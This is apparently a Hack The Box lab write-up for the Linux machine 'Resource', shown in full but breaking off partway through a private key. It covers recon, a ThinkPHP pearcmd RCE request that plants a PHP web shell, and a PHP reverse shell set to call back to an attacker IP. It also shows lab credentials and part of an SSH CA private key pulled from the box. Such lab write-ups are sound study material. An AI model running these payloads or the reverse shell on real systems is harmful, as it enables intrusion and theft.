---
Category: HTB/Machines/Linux
tags:
  - HTB
  - Machine
  - Linux
  - Medium
  - ThinkPHP
  - RemoteCodeExecution
  - RCE
  - Docker
  - Container
  - SSHKey
  - SSHSigning
  - CertificateAuthority
  - Certificates
  - AuthenticationPrincipals
  - ContainerEscape
  - CAP_MKNOD
  - RemoteDiskImageDumping
  - SensitiveFileContentLeaking
---

![](images/Resource.png)

## Summary

First the box starts with two `different ports` for `SSH`. One is running on default port `22/TCP` and the second one is running on `2222/TCP`. The box also provides some sort of `ticket system` via port `80/TCP`. After registering and logging in you can `create tickets` and attach `.zip files` to them. By abusing a `Remote Code Execution (RCE)` vulnerability in `ThinkPHP` using `pearcmd` makes you able to upload a `web shell` and download `.zip files` of others users tickets. One of them contain `credentials` for the user `msainristil` which allows you to access the box running on port `22/TCP`. This sends you into a `Docker container`. In the `home directory` of `msainristil` a `decommissioned_old_ca` folder can be found which contain the `SSH private key` of an obviously decommissioned `Certificate Authority`. This allows to create a `"certificate"` for any user available in the `container` which then can be used to login via `SSH` on `localhost` and achieve `privilege escalation`. This leads to the `user` called `zzinter` which holds the `user.txt`. The user `zzinter` also has a script `sign_key_api.sh` inside his `home directory` which contains another user called `support`. By using the script it is possible to `pivot` to `support` on the `host` itself. With the newly obtained user some `authentication principals` inside `/etc/ssh/auth_principals` can be found which shows that `zzintern` has an additional `principal` called `zzinter_temp`. Repeating the steps before allows to sign another `"certificate"` for `zzinter` using his `zzinter_temp` principal by adding him to the `supported_principals` saved in a copy of the script. From there on the `intended solution` is to use execute `/opt/sign_key.sh` with `sudo` and leak the content of `it-ca` inside the `/etc/ssh` directory to then `sign` another `"certificate"` as `root` on the `host`. Since this is quite lame we decided to go for an `unintended solution` which requires `privilege escalation` to `root` inside the `container` by repeating the `signing steps` of the beginning and then abusing the `CAP_MKNOD` capability to create a `data blob` through which it is possible to `read files` on the `host`. This can be pushed to an absurd level of creating a `disk image` using `dd` and `remote dump` it through `SSH` to finally mount it locally and extract any file from the box and especially the `root.txt` and the `it-ca` which contains the `private key` of the new `Certificate Authrority`. The unintended solution is by far the coolest thing our team did in a long time! It was awesome!

## Table of Contents

- [Reconnaissance](#Reconnaissance)
    - [Port Scanning](#Port-Scanning)
    - [Enumeration of Port 80/TCP](#Enumeration-of-Port-80TCP)
    - [Directory Busting](#Directory-Busting)
    - [Fuzzing the page Endpoint](#Fuzzing-the-page-Endpoint)
- [Upload Vulnerability](#Upload-Vulnerability)
    - [ThinkPHP Remote Code Execution (RCE)](#ThinkPHP-Remote-Code-Execution-RCE)
        - [Payload](#Payload)
        - [Upload Web Shell](#Upload-Web-Shell)
- [Foothold](#Foothold)
- [msainristil User Enumeration](#msainristil-User-Enumeration)
- [Privilege Escalation to zzinter (Container)](#Privilege-Escalation-to-zzinter-Container)
- [user.txt](#usertxt)
- [zzinter User Pivoting (Container)](#zzinter-User-Pivoting-Container)
- [Privilege Escalation to support (Host)](#Privilege-Escalation-to-support-Host)
- [support User Pivoting (Host)](#support-User-Pivoting-Host)
- [Privilege Escalation to zzinter (Host)](#Privilege-Escalation-to-zzinter-Host)
- [zzinter User Pivoting (Host)](#zzinter-User-Pivoting-Host)
- [Unintended Solution](#Unintended-Solution)
    - [Abusing Docker Container for Remote Disk Image Dumping](#Abusing-Docker-Container-for-Remote-Disk-Image-Dumping)
- [root.txt](#roottxt)
- [Post Exploitation](#Post-Exploitation)
- [Intended Solution](#Intended-Solution)

## Reconnaissance

### Port Scanning

Our first step as usual was to scan for available ports on the system. The box had two different ports open for `SSH`. The usual port `22/TCP` and a high port `2222/TCP` which ran a different version of `SSH`. That could been an indicator for some sort of `containerized solution`.

```c
┌──(kali㉿kali)-[~]
└─$ sudo nmap -sC -sV 10.129.251.225
[sudo] password for kali: 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-03 21:02 CEST
Nmap scan report for 10.129.251.225
Host is up (0.018s latency).
Not shown: 997 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 9.2p1 Debian 2+deb12u3 (protocol 2.0)
| ssh-hostkey: 
|   256 d5:4f:62:39:7b:d2:22:f0:a8:8a:d9:90:35:60:56:88 (ECDSA)
|_  256 fb:67:b0:60:52:f2:12:7e:6c:13:fb:75:f2:bb:1a:ca (ED25519)
80/tcp   open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://itrc.ssg.htb/
2222/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 f2:a6:83:b9:90:6b:6c:54:32:22:ec:af:17:04:bd:16 (ECDSA)
|_  256 0c:c3:9c:10:f5:7f:d3:e4:a8:28:6a:51:ad:1a:e1:bf (ED25519)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.82 seconds
```

```c
┌──(kali㉿kali)-[~]
└─$ sudo nmap -sC -sV -p- 10.129.251.225
[sudo] password for kali: 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-04 08:30 CEST
Nmap scan report for itrc.ssg.htb (10.129.251.225)
Host is up (0.019s latency).
Not shown: 65532 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 9.2p1 Debian 2+deb12u3 (protocol 2.0)
| ssh-hostkey: 
|   256 d5:4f:62:39:7b:d2:22:f0:a8:8a:d9:90:35:60:56:88 (ECDSA)
|_  256 fb:67:b0:60:52:f2:12:7e:6c:13:fb:75:f2:bb:1a:ca (ED25519)
80/tcp   open  http    nginx 1.18.0 (Ubuntu)
|_http-title: IT Support Center
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-server-header: nginx/1.18.0 (Ubuntu)
2222/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 f2:a6:83:b9:90:6b:6c:54:32:22:ec:af:17:04:bd:16 (ECDSA)
|_  256 0c:c3:9c:10:f5:7f:d3:e4:a8:28:6a:51:ad:1a:e1:bf (ED25519)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 336.26 seconds
```

```c
┌──(kali㉿kali)-[~]
└─$ sudo nmap -sV -sU 10.129.251.225
[sudo] password for kali: 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-04 09:25 CEST
Nmap scan report for itrc.ssg.htb (10.129.251.225)
Host is up (0.019s latency).
Not shown: 999 closed udp ports (port-unreach)
PORT   STATE         SERVICE VERSION
68/udp open|filtered dhcpc

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 1120.20 seconds
```

### Enumeration of Port 80/TCP

As we accessed the box on port `80/TCP` using the `IP address` we got redirected to `itrc.ssg.htb` which we added to our `/etc/hosts` file.

- [http://10.129.251.225/](http://10.129.251.225/)

```c
┌──(kali㉿kali)-[~]
└─$ cat /etc/hosts
127.0.0.1       localhost
127.0.1.1       kali
10.129.251.225  itrc.ssg.htb
```

- [http://itrc.ssg.htb/](http://itrc.ssg.htb/)

The app stack didn't showed anything unusual and the website allowed `registration` and `login`.

```c
┌──(kali㉿kali)-[~]
└─$ whatweb http://itrc.ssg.htb/
http://itrc.ssg.htb/ [200 OK] Bootstrap, Cookies[PHPSESSID], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][nginx/1.18.0 (Ubuntu)], IP[10.129.251.225], PHP[8.1.29], Script, Title[IT Support Center], X-Powered-By[PHP/8.1.29], nginx[1.18.0]
```

![](images/2024-08-03_21-06_80_website.png)

So we registered a random username and logged in.

![](images/2024-08-03_21-07_80_register.png)

![](images/2024-08-03_21-07_80_login.png)

It seemed that every account was able to `create` and `view` tickets like on an `helpdesk system`.

![](images/2024-08-03_21-08_80_ticket_system.png)

When we headed back to the dashboard we noticed that the `URL` changed to display `dashboard` without `file extension`.

- [http://itrc.ssg.htb/?page=dashboard](http://itrc.ssg.htb/?page=dashboard)

![](images/2024-08-03_21-29_80_page.png)

### Directory Busting

While doing `directory busting` we found some interesting endpoints like `admin.php`, `api`, `assets`, `db.php` and `uploads`.

```c
┌──(kali㉿kali)-[~]
└─$ dirsearch -u http://itrc.ssg.htb/

  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /home/kali/reports/http_itrc.ssg.htb/__24-08-03_21-21-15.txt

Target: http://itrc.ssg.htb/

[21:21:15] Starting: 
[21:21:22] 403 -  277B  - /.ht_wsr.txt                                      
[21:21:22] 403 -  277B  - /.htaccess.bak1                                   
[21:21:22] 403 -  277B  - /.htaccess.orig                                   
[21:21:22] 403 -  277B  - /.htaccess.sample
[21:21:22] 403 -  277B  - /.htaccess.save
[21:21:22] 403 -  277B  - /.htaccess_extra                                  
[21:21:22] 403 -  277B  - /.htaccessBAK
[21:21:22] 403 -  277B  - /.htaccessOLD
[21:21:22] 403 -  277B  - /.htaccessOLD2
[21:21:22] 403 -  277B  - /.htm                                             
[21:21:23] 403 -  277B  - /.htaccess_sc                                     
[21:21:23] 403 -  277B  - /.htpasswd_test                                   
[21:21:23] 403 -  277B  - /.htpasswds
[21:21:23] 403 -  277B  - /.httr-oauth
[21:21:23] 403 -  277B  - /.html                                            
[21:21:23] 403 -  277B  - /.htaccess_orig                                   
[21:21:49] 200 -   46B  - /admin.php                                        
[21:22:12] 301 -  310B  - /api  ->  http://itrc.ssg.htb/api/                
[21:22:13] 403 -  277B  - /api/                                             
[21:22:16] 301 -  313B  - /assets  ->  http://itrc.ssg.htb/assets/          
[21:22:19] 403 -  277B  - /assets/                                          
[21:22:35] 200 -   46B  - /dashboard.php                                    
[21:22:35] 200 -    0B  - /db.php                                           
[21:22:52] 200 -  507B  - /home.php                                         
[21:23:05] 200 -  241B  - /login.php                                        
[21:23:06] 302 -    0B  - /logout.php  ->  index.php                        
[21:23:37] 200 -  263B  - /register.php                                     
[21:23:40] 403 -  277B  - /server-status/                                   
[21:23:41] 403 -  277B  - /server-status                                    
[21:24:00] 301 -  314B  - /uploads  ->  http://itrc.ssg.htb/uploads/        
[21:24:00] 403 -  277B  - /uploads/                                         
                                                                             
Task Completed
```

### Fuzzing the page Endpoint

Since we knew that the application loaded `pages` without `file extension`, we fuzzed the endpoint to see if we find anything we could access.

```c
┌──(kali㉿kali)-[~]
└─$ ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/namelist.txt -u http://itrc.ssg.htb/index.php?page=FUZZ --fs 3120

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://itrc.ssg.htb/index.php?page=FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/DNS/namelist.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 3120
________________________________________________

admin                   [Status: 200, Size: 1331, Words: 136, Lines: 26, Duration: 491ms]
<--- CUT FOR BREVITY --->
```

We got lucky and could access `admin` without any authentication.

- [view-source:http://itrc.ssg.htb/?page=admin](view-source:http://itrc.ssg.htb/?page=admin)

![](images/2024-08-03_21-32_80_admin_dashboard.png)

The `admin dashboard` showed an interesting option to provide a user access via `SSH` and also a hint to contact a user called `zzinter` for additional information.

```c
        <br/>
            <div class="row">
                <div class="col-4"> 
                    <label class="admin-label" for="provisionSSH" class="form-label">Provision User SSH: </label>
                </div>
                <div class="col-8">
                    <div class="input-group w-100">
                    <input
                        type="text"
                        id="provisionSSH"
                        class="form-control w-auto"
                        placeholder="Unavailable. Contact zzinter for manual provisioning."
                        aria-describedby="button-provision-ssh"
                        readonly
                    />
                    <button class="btn btn-secondary" type="button" id="button-provision-ssh" data-mdb-ripple-color="dark" disabled>Go</button>
                </div>
            </div>
        </div>
```

![](images/2024-08-03_21-36_80_admin_dashboard_source.png)

| Username |
| -------- |
| zzinter  |

## Upload Vulnerability

We headed back to our own `dashboard` and tried to upload a `web shell` or `reverse shell` packed in a `.zip file`.

```c
┌──(kali㉿kali)-[/media/…/HTB/Machines/Resource/files]
└─$ wget https://raw.githubusercontent.com/ivan-sincek/php-reverse-shell/master/src/reverse/php_reverse_shell.php
--2024-08-03 22:14:08--  https://raw.githubusercontent.com/ivan-sincek/php-reverse-shell/master/src/reverse/php_reverse_shell.php
Resolving raw.githubusercontent.com (raw.githubusercontent.com)... 185.199.111.133, 185.199.110.133, 185.199.108.133, ...
Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|185.199.111.133|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 9403 (9.2K) [text/plain]
Saving to: ‘php_reverse_shell.php’

php_reverse_shell.php                                      100%[========================================================================================================================================>]   9.18K  --.-KB/s    in 0.003s  

2024-08-03 22:14:09 (3.05 MB/s) - ‘php_reverse_shell.php’ saved [9403/9403]
```

```c
┌──(kali㉿kali)-[/media/…/HTB/Machines/Resource/files]
└─$ tail php_reverse_shell.php 
}
echo '<pre>';
// change the host address and/or port number as necessary
$sh = new Shell('10.10.14.53', 9000);
$sh->run();
unset($sh);
// garbage collector requires PHP v5.3.0 or greater
// @gc_collect_cycles();
echo '</pre>';
?>
```

```c
┌──(kali㉿kali)-[/media/…/HTB/Machines/Resource/files]
└─$ zip shell.php php_reverse_shell.php 
  adding: php_reverse_shell.php (deflated 72%)
```

We could upload the file but accessing it did nothing for us. We just verified that we could place files on the system.

![](images/2024-08-03_22-17_80_ticket_shell.png)

By checking the attached `.zip file` we found the `URL` where the file got dropped. The application `changed` the `name` to the `hash` of the file.

```c
http://itrc.ssg.htb/uploads/6c96b886f429025ca57e676c7d328412bfb61863.zip
```

```c
┌──(kali㉿kali)-[~]
└─$ hash-identifier 
   #########################################################################
   #     __  __                     __           ______    _____           #
   #    /\ \/\ \                   /\ \         /\__  _\  /\  _ `\         #
   #    \ \ \_\ \     __      ____ \ \ \___     \/_/\ \/  \ \ \/\ \        #
   #     \ \  _  \  /'__`\   / ,__\ \ \  _ `\      \ \ \   \ \ \ \ \       #
   #      \ \ \ \ \/\ \_\ \_/\__, `\ \ \ \ \ \      \_\ \__ \ \ \_\ \      #
   #       \ \_\ \_\ \___ \_\/\____/  \ \_\ \_\     /\_____\ \ \____/      #
   #        \/_/\/_/\/__/\/_/\/___/    \/_/\/_/     \/_____/  \/___/  v1.2 #
   #                                                             By Zion3R #
   #                                                    www.Blackploit.com #
   #                                                   Root@Blackploit.com #
   #########################################################################
--------------------------------------------------
 HASH: 6c96b886f429025ca57e676c7d328412bfb61863

Possible Hashs:
[+] SHA-1
[+] MySQL5 - SHA-1(SHA-1($pass))

Least Possible Hashs:
[+] Tiger-160
[+] Haval-160
[+] RipeMD-160
[+] SHA-1(HMAC)
[+] Tiger-160(HMAC)
[+] RipeMD-160(HMAC)
[+] Haval-160(HMAC)
[+] SHA-1(MaNGOS)
[+] SHA-1(MaNGOS2)
[+] sha1($pass.$salt)
[+] sha1($salt.$pass)
[+] sha1($salt.md5($pass))
[+] sha1($salt.md5($pass).$salt)
[+] sha1($salt.sha1($pass))
[+] sha1($salt.sha1($salt.sha1($pass)))
[+] sha1($username.$pass)
[+] sha1($username.$pass.$salt)
[+] sha1(md5($pass))
[+] sha1(md5($pass).$salt)
[+] sha1(md5(sha1($pass)))
[+] sha1(sha1($pass))
[+] sha1(sha1($pass).$salt)
[+] sha1(sha1($pass).substr($pass,0,3))
[+] sha1(sha1($salt.$pass))
[+] sha1(sha1(sha1($pass)))
[+] sha1(strtolower($username).$pass)
--------------------------------------------------
 HASH:
```

### ThinkPHP Remote Code Execution (RCE)

After `DarkCat` did some `Google magic` he found a well known vulnerability in `ThinkPHP` which allowed `Remote Code Execution (RCE)` via `pearcmd`.

- [https://github.com/Mr-xn/thinkphp_lang_RCE](https://github.com/Mr-xn/thinkphp_lang_RCE)
- [https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/cve.md#thinkphp--6014-remote-code-execution-rce](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/cve.md#thinkphp--6014-remote-code-execution-rce)

We modified the payload to store a simple `web shell` on the system.

#### Payload

```c
/index.php?s=index/index/index/think_lang/../../extend/pearcmd/pearcmd/index&cmd=whoami
```

#### Upload Web Shell

```c
GET /?+config-create+/&page=/usr/local/lib/php/pearcmd&/<?=system($_GET['cmd']);?>+/var/www/itrc/uploads/test.php HTTP/1.1
Host: itrc.ssg.htb
Cache-Control: max-age=0
Accept-Language: en-US
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.6478.127 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br
Cookie: PHPSESSID=641f3a46c93a6aa4ae9d2eb87f24d283
Connection: keep-alive


```

![](images/2024-08-04_08-17_80_thinkphp_rce.png)

- [http://itrc.ssh.htb/?page=/index.php?s=/usr/local/lib/php/pearcmd&whoami](http://itrc.ssh.htb/?page=/index.php?s=/usr/local/lib/php/pearcmd&whoami)

![](images/2024-08-04_08-21_80_thinkphp_webshell.png)

- [http://itrc.ssh.htb/uploads/test.php?cmd=id](http://itrc.ssh.htb/uploads/test.php?cmd=id)

```c
GET /uploads/test.php?cmd=id HTTP/1.1
Host: itrc.ssg.htb
Cache-Control: max-age=0
Accept-Language: en-US
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.6478.127 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br
Cookie: PHPSESSID=641f3a46c93a6aa4ae9d2eb87f24d283
Connection: keep-alive


```

![](images/2024-08-04_08-22_80_webshell_trigger.png)

![](images/2024-08-04_08-22_80_webshell_output.png)

## Foothold

After we ensured that the `web shell` worked and we definitely got `Remote Code Execution (RCE)`, we started enumerating the system.

We found several `.zip files` we had a closer look on.

```c
GET /uploads/test.php?cmd=ls HTTP/1.1
Host: itrc.ssg.htb
Cache-Control: max-age=0
Accept-Language: en-US
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.6478.127 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br
Cookie: PHPSESSID=641f3a46c93a6aa4ae9d2eb87f24d283
Connection: keep-alive


```

![](images/2024-08-04_08-24_80_webshell_read_tickets.png)

The file `c2f4813259cc57fab36b311c5058cf031cb6eb51.zip` contained some `credentials`.

- [http://itrc.ssg.htb//uploads/c2f4813259cc57fab36b311c5058cf031cb6eb51.zip](http://itrc.ssg.htb//uploads/c2f4813259cc57fab36b311c5058cf031cb6eb51.zip)

```c
┌──(kali㉿kali)-[/media/…/HTB/Machines/Resource/files]
└─$ wget http://itrc.ssg.htb//uploads/c2f4813259cc57fab36b311c5058cf031cb6eb51.zip
--2024-08-04 08:25:12--  http://itrc.ssg.htb//uploads/c2f4813259cc57fab36b311c5058cf031cb6eb51.zip
Resolving itrc.ssg.htb (itrc.ssg.htb)... 10.129.251.225
Connecting to itrc.ssg.htb (itrc.ssg.htb)|10.129.251.225|:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 1162513 (1.1M) [application/zip]
Saving to: ‘c2f4813259cc57fab36b311c5058cf031cb6eb51.zip’

c2f4813259cc57fab36b311c5058cf031cb6eb51.zip               100%[========================================================================================================================================>]   1.11M   333KB/s    in 3.4s    

2024-08-04 08:25:15 (333 KB/s) - ‘c2f4813259cc57fab36b311c5058cf031cb6eb51.zip’ saved [1162513/1162513]
```

```c
┌──(kali㉿kali)-[/media/…/HTB/Machines/Resource/files]
└─$ unzip c2f4813259cc57fab36b311c5058cf031cb6eb51.zip 
Archive:  c2f4813259cc57fab36b311c5058cf031cb6eb51.zip
  inflating: itrc.ssg.htb.har
```

```c
          "headersSize": 647,
          "bodySize": 37,
          "postData": {
            "mimeType": "application/x-www-form-urlencoded",
            "text": "user=msainristil&pass=82yards2closeit",
            "params": [
              {
                "name": "user",
                "value": "msainristil"
              },
              {
                "name": "pass",
                "value": "82yards2closeit"
              }
            ]
          }
        },
```

```c
┌──(kali㉿kali)-[/media/…/HTB/Machines/Resource/files]
└─$ cat itrc.ssg.htb.har | grep msainristil
            "text": "user=msainristil&pass=82yards2closeit",
                "value": "msainristil"
```

| Username    | Password        |
| ----------- | --------------- |
| msainristil | 82yards2closeit |

We also found an additional username.

```c
          "cookies": [
            {
              "name": "PHPSESSID",
              "value": "715eb6b6bc27fcafcbe73bd0a33223bc",
              "path": "/",
              "domain": "itrc.ssg.htb",
              "expires": "1969-12-31T23:59:59.000Z",
              "httpOnly": false,
              "secure": false
            }
          ],
          "headersSize": 442,
          "bodySize": 34,
          "postData": {
            "mimeType": "application/json",
            "text": "{\"mode\":\"ssh\",\"user\":\"bcmcgregor\"}"
          }
        },
```

| Username   |
| ---------- |
| bcmcgregor |

The username `msainristil` we found earlier and his corresponding `password` allowed us to `SSH` into the box on port `22/TCP`.

```c
┌──(kali㉿kali)-[~]
└─$ ssh msainristil@10.129.251.225
The authenticity of host '10.129.251.225 (10.129.251.225)' can't be established.
ED25519 key fingerprint is SHA256:PVHxOqGsN7oX50zMsl/3O2BPQ3u50UhffyNeJZuo2K4.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.129.251.225' (ED25519) to the list of known hosts.
msainristil@10.129.251.225's password: 
Linux itrc 5.15.0-117-generic #127-Ubuntu SMP Fri Jul 5 20:13:28 UTC 2024 x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Thu Jul 25 12:49:05 2024 from 10.10.14.23
msainristil@itrc:~$
```

## msainristil User Enumeration

We performed some basic checks but it seemed that the user had very limited permissions on the box.

```c
msainristil@itrc:~$ id
uid=1000(msainristil) gid=1000(msainristil) groups=1000(msainristil)
```

```c
msainristil@itrc:~$ sudo -l
-bash: sudo: command not found
```

Nevertheless we could verify that the user we found earlier, `zzinter`, was a valid user on the system.

```c
msainristil@itrc:~$ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
sshd:x:100:65534::/run/sshd:/usr/sbin/nologin
msainristil:x:1000:1000::/home/msainristil:/bin/bash
zzinter:x:1001:1001::/home/zzinter:/bin/bash
```

After we had a closer look on the `root directory` we found a `.dockerenv` which indicated that we were indeed inside a `Docker container`.

```c
msainristil@itrc:~$ ls -la /
total 7632
drwxr-xr-x   1 root root    4096 Jul 23 14:22 .
drwxr-xr-x   1 root root    4096 Jul 23 14:22 ..
-rwxr-xr-x   1 root root       0 Jul 23 14:22 .dockerenv
lrwxrwxrwx   1 root root       7 Jul 22 00:00 bin -> usr/bin
drwxr-xr-x   2 root root    4096 Mar 29 17:20 boot
drwxr-xr-x   5 root root     340 Aug  3 19:01 dev
drwxr-xr-x   1 root root    4096 Jul 23 14:22 etc
drwxr-xr-x   1 root root    4096 Jul 23 14:22 home
lrwxrwxrwx   1 root root       7 Jul 22 00:00 lib -> usr/lib
lrwxrwxrwx   1 root root       9 Jul 22 00:00 lib64 -> usr/lib64
drwxr-xr-x   2 root root    4096 Jul 22 00:00 media
drwxr-xr-x   2 root root    4096 Jul 22 00:00 mnt
drwxr-xr-x   1 root root    4096 Jul 23 14:22 opt
dr-xr-xr-x 295 root root       0 Aug  3 19:01 proc
drwx------   1 root root    4096 Jul 23 14:22 root
drwxr-xr-x   1 root root    4096 Aug  4 06:31 run
lrwxrwxrwx   1 root root       8 Jul 22 00:00 sbin -> usr/sbin
drwxr-xr-x   2 root root    4096 Jul 22 00:00 srv
dr-xr-xr-x  13 root root       0 Aug  3 19:01 sys
drwxrwxrwt   1 root root 7737344 Aug  3 20:48 tmp
drwxr-xr-x   1 root root    4096 Jul 22 00:00 usr
drwxr-xr-x   1 root root    4096 Jul 23 06:39 var
```

Further in the `home directory` of `msainristil` we found a folder called `decommission_old_ca` which administrators typically create to keep a backup of an old `certificate authority` until they ensured that the new one is running properly.

```c
msainristil@itrc:~$ ls -la
total 32
drwx------ 1 msainristil msainristil 4096 Jul 23 14:22 .
drwxr-xr-x 1 root        root        4096 Jul 23 14:22 ..
lrwxrwxrwx 1 root        root           9 Jul 23 14:22 .bash_history -> /dev/null
-rw-r--r-- 1 msainristil msainristil  220 Mar 29 19:40 .bash_logout
-rw-r--r-- 1 msainristil msainristil 3526 Mar 29 19:40 .bashrc
-rw-r--r-- 1 msainristil msainristil  807 Mar 29 19:40 .profile
drwxr-xr-x 1 msainristil msainristil 4096 Jan 24  2024 decommission_old_ca
```

```c
msainristil@itrc:~/decommission_old_ca$ ls -la
total 20
drwxr-xr-x 1 msainristil msainristil 4096 Jan 24  2024 .
drwx------ 1 msainristil msainristil 4096 Jul 23 14:22 ..
-rw------- 1 msainristil msainristil 2602 Jan 24  2024 ca-itrc
-rw-r--r-- 1 msainristil msainristil  572 Jan 24  2024 ca-itrc.pub
```

```c
msainristil@itrc:~/decommission_old_ca$ cat ca-itrc
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
NhAAAAAwEAAQAAAYEA6AQ9VKBXy+NYPxVV9+963ZuVj8/kmdG1reT2D/nYaJOL291KSTyB
jngLF5gJMxFWARyIhPmhm63F7w2km2XOnCNmmXxa2hD7dPNClShwCwD4Gjp/8xXZXfD/cm
hDSgSpbVi2fSOq8IPfCBhE6AeyTWRfYc2rI4w9CAyr/CUNzcIpg3GU3Oi3tIScOdgDXC7M
7XpYhUsqE7cvTf6FIE1I5BbILK6BIfjp8+G7lQ9m8aGfvZjg3HWE0OAocGp38xUp0607QE
Kybch/2w0U2tgaZnZmHULvuB3Gw5eTW4hMLtRTbJM/2DQz5Kt2xGBDr4DIrv9GTMtMHq3M
ek59BtnKaUu9P6xuRjHCYtFk3FInN5PlydfdVhBtRLVyTW2XbSXOystBCoWrdHYHJPM6au
tpHo7ZAUHfOqehb0fPsR9/yTMR7zDVWFTgybfzCIpPfbFm+UOzQlXCF0NHo1U80yPUE9u5
JvxVIJd3LOQmeBiDe6aJT3p0FxJnZmwTlg9oa5S7AAAFiE//PKhP/zyoAAAAB3NzaC1yc2
EAAAGBAOgEPVSgV8vjWD8VVffvet2blY/P5JnRta3k9g/52GiTi9vdSkk8gY54CxeYCTMR
VgEciIT5oZutxe8NpJtlzpwjZpl8WtoQ+3TzQpUocAsA+Bo6f/MV2V3w/3JoQ0oEqW1Ytn
0jqvCD3wgYROgHsk1kX2HNqyOMPQgMq/wlDc3CKYNxlNzot7SEnDnYA1wuzO16WIVLKhO3
L03+hSBNSOQWyCyugSH46fPhu5UPZvGhn72Y4Nx1hNDgKHBqd/MVKdOtO0BCsm3If9sNFN
rYGmZ2Zh1C77gdxsOXk1uITC7UU2yTP9g0M+SrdsRgQ6+AyK7/RkzLTB6tzHpOfQbZymlL
vT+sbkYxwmLRZNxSJzeT5cnX3VYQbUS1ck1tl20lzsrLQQqFq3R2ByTzOmrraR6O2QFB3z
qnoW9Hz7Eff8kzEe8w1VhU4Mm38wiKT32xZvlDs0JVwhdDR6NVPNMj1BPbuSb8VSCXdyzk
